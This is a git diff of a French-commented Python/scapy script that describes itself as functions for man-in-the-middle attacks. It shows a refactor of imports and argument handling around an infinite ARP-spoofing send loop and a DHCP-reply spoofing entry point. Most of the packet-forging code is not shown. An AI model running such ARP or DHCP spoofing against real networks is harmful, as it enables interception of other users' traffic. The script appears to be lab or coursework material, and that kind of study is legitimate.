@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 '''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
 from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump
-import time as t
-import sys
+from time import sleep
+from sys import argv
 
 def mac(ip:str)->str:
   '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
@@ -29,7 +29,7 @@ def arp(ipa:str, ipb:str)->None:
   while True: #Boucle infinie
     sendp(paquet1, iface='enp0s3')
     sendp(paquet2, iface='enp0s3')
-    t.sleep(5) #Arrete le processus durant X secondes
+    sleep(5) #Arrete le processus durant X secondes
 
 def dhcp():
   def dhcp_reply(paquet):
@@ -45,9 +45,9 @@ def dhcp():
   print("oui")
 
 if __name__ == "__main__":
-  if sys.argv[1] == "1":
-    arp(sys.argv[2], sys.argv[3])
-  if sys.argv[1] == "2":
+  if argv[1] == "1":
+    arp(argv[2], argv[3])
+  if argv[1] == "2":
     dhcp()
   else:
     print("1 adresse_ip1 adresse_ip2 - arp\n2 - dhcp")
